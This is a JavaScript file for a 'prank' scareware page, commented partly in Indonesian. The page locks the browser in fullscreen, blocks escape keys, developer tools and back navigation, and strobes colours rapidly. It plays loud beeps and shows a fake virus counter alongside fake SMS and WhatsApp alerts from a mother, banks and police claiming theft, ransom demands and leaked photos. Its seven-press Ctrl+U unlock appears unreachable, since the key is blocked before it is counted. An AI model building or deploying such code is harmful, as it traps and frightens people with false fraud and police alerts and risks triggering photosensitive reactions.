// 🔥 ULTIMATE FULLSCREEN LOCK - NO ESCAPE MODE 🔥

// VARS
let virusCount = 0, ctrlUCount = 0, scanPerc = 99, isLocked = true;

// 1. FORCE FULLSCREEN + PREVENT EXIT (LOOP INFINITE)
function forceFullscreen() {
    try {
        if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(() => {});
        }
    } catch(e) {}
}

// Auto-trigger fullscreen setiap detik
setInterval(forceFullscreen, 1000);

// 2. BLOCK ALL ESC KEYS + BROWSER CONTROLS
document.addEventListener('keydown', (e) => {
    // Block ESC, F11, F12, Ctrl+Shift+I, etc
    const blockedKeys = ['Escape', 'F11', 'F12', 'F5', 'KeyR'];
    if (blockedKeys.includes(e.code) || 
        (e.ctrlKey && (e.key === 'u' || e.key === 'i' || e.key === 'j' || e.shiftKey)) ||
        (e.altKey && e.key === 'F4')) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
    
    // ONLY allow CTRL+U counter
    if (e.ctrlKey && e.key === 'u') {
        ctrlUCount++;
        if (ctrlUCount >= 7) unlockPrank();
        return;
    }
}, true);

// 3. BLOCK CONTEXT MENU + INSPECTOR
document.addEventListener('contextmenu', e => e.preventDefault());
document.onselectstart = () => false;
document.oncontextmenu = () => false;

// 4. FULLSCREEN EXIT BLOCKER
document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement && isLocked) {
        setTimeout(forceFullscreen, 100);
    }
});

// 5. GLITCH HELL + HORROR BEEP (SAME AS BEFORE)
setInterval(() => {
    document.body.style.filter = `hue-rotate(${Math.random()*360}deg) contrast(${1+Math.random()})`;
}, 80);

function horrorBeep() {
    try {
        document.getElementById('beepSound').play();
    } catch(e) {}
    const audioCtx = new (window.AudioContext||window.webkitAudioContext)();
    const osc = audioCtx.createOscillator();
    osc.type = 'sawtooth';
    osc.frequency.value = 666 + Math.random()*666;
    osc.connect(audioCtx.destination);
    osc.start();
    setTimeout(()=>osc.stop(), 300);
}
setInterval(horrorBeep, 700);

// 6. VIRUS COUNTER + FAKE IP (SAME)
setInterval(() => {
    virusCount += Math.floor(Math.random()*150)+25;
    document.getElementById('count').textContent = virusCount.toLocaleString();
}, 900);

setInterval(() => {
    document.getElementById('fakeIP').textContent = Math.floor(Math.random()*255);
}, 2000);

// 7. SCAN % (SAME)
setInterval(() => {
    scanPerc = Math.min(100, scanPerc + Math.floor(Math.random()*5));
    document.getElementById('scanPerc').textContent = scanPerc;
}, 1500);

// 8. PIN FAIL = MORE CHAOS (wajib salah)
function checkPin() {
    const pin = document.getElementById('pin');
    const popup = document.getElementById('popup');
    
    // SHOW MASSIVE ERROR
    popup.style.display = 'block';
    popup.innerHTML = `❌❌ PIN SALAH! Virus +${Math.floor(Math.random()*1000)}! 😱💀`;
    
    // SCREEN SHAKE + STROBE
    document.body.classList.add('strobe', 'shake');
    setTimeout(()=>document.body.classList.remove('strobe', 'shake'), 2000);
    
    // VIBRATE HP
    navigator.vibrate?.([500,200,500,200,500]);
    
    pin.value = '';
    setTimeout(() => popup.style.display = 'none', 3000);
    
    // FORCE FULLSCREEN AGAIN
    forceFullscreen();
}

// 9. FAKE CAMERA GLITCH (FULLSCREEN)
setTimeout(() => {
    const glitch = document.createElement('canvas');
    glitch.id = 'glitchCam';
    glitch.width = window.innerWidth;
    glitch.height = window.innerHeight;
    glitch.style.cssText = `
        position:fixed;top:0;left:0;width:100vw;height:100vh;
        z-index:9998;pointer-events:none;mix-blend-mode:screen;
        filter:grayscale(100%) contrast(300%);
    `;
    document.body.appendChild(glitch);
    
    const ctx = glitch.getContext('2d');
    function glitchAnim() {
        ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*50},${Math.random()*255})`;
        ctx.fillRect(0,0,glitch.width,glitch.height);
        requestAnimationFrame(glitchAnim);
    }
    glitchAnim();
}, 8000);

// 10. FAKE CALL FULLSCREEN LOCK
setTimeout(() => {
    document.getElementById('fakeCall').style.display = 'flex';
    document.querySelector('.lock-screen').style.display = 'none';
}, 12000);

// 11. HISTORY LOCK (cannot back)
history.pushState(null, null, location.href);
window.addEventListener('popstate', () => history.pushState(null, null, location.href));

// 12. MOUSE MOVEMENT LOCK
document.addEventListener('mousemove', (e) => {
    if (isLocked) {
        // Center cursor + shake
        const centerX = window.innerWidth / 2;
        const centerY = window.innerHeight / 2;
        document.body.style.cursor = 'none';
    }
});

// 13. SMS/WA HELL (SAME AS BEFORE)
const smsMessages = [
    {from: "Mama ❤️", msg: "Nak HP lu kena hack! Cepet matiin! 😰"},
    {from: "Bank BCA", msg: "ALERT! Rp 2.500.000 dicuri hacker!"},
    {from: "Telkomsel", msg: "Data habis 95%! Virus aktif!"},
    {from: "GoPay", msg: "Saldo -Rp 750.000! Hacker transfer!"},
    {from: "Police", msg: "HP dilacak polisi! Jangan matiin!"}
];

function sendFakeSMS() {
    const container = document.getElementById('smsContainer');
    container.style.display = 'flex';
    
    const sms = document.createElement('div');
    const randomMsg = smsMessages[Math.floor(Math.random() * smsMessages.length)];
    sms.className = 'sms-notification';
    sms.innerHTML = `
        <div style="font-weight: bold; font-size: 16px;">📱 ${randomMsg.from}</div>
        <div>${randomMsg.msg}</div>
        <div style="font-size: 11px; opacity: 0.8;">
            ${new Date().toLocaleTimeString('id-ID')}
        </div>
    `;
    container.appendChild(sms);
    
    setTimeout(() => {
        if (sms.parentNode) sms.remove();
    }, 8000);
    
    setTimeout(sendFakeSMS, 3000);
}

setTimeout(sendFakeSMS, 3000);

const waMessages = [
    "Hacker minta 5 juta tebusan!",
    "Semua foto lu di deepweb!",
    "Virus nyebar ke kontak!",
    "Rekening lu kosong sekarang!"
];

function sendFakeWA() {
    const container = document.getElementById('waContainer');
    container.style.display = 'flex';
    
    const wa = document.createElement('div');
    wa.className = 'wa-notification';
    wa.innerHTML = `💬 <strong>${waMessages[Math.floor(Math.random()*waMessages.length)]}</strong>`;
    
    container.appendChild(wa);
    setTimeout(() => wa.remove(), 6000);
    setTimeout(sendFakeWA, 4000);
}

setTimeout(sendFakeWA, 5000);

// 14. ESCAPE ONLY CTRL+U 7x
function unlockPrank() {
    isLocked = false;
    document.exitFullscreen?.();
    document.body.innerHTML = `
        <div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:lime;font-size:4em;font-family:Arial;text-align:center;text-shadow:0 0 50px lime;z-index:99999;">
            🎉 PRANK SELESAI! 😂😂😂<br><br>
            <span style="font-size:0.5em;color:#fff;">CTRL+U 7x berhasil! You survived!</span>
        </div>
    `;
}

// 15. START LOCK IMMEDIATELY
window.onload = () => {
    setTimeout(forceFullscreen, 500);
    document.body.style.overflow = 'hidden';
};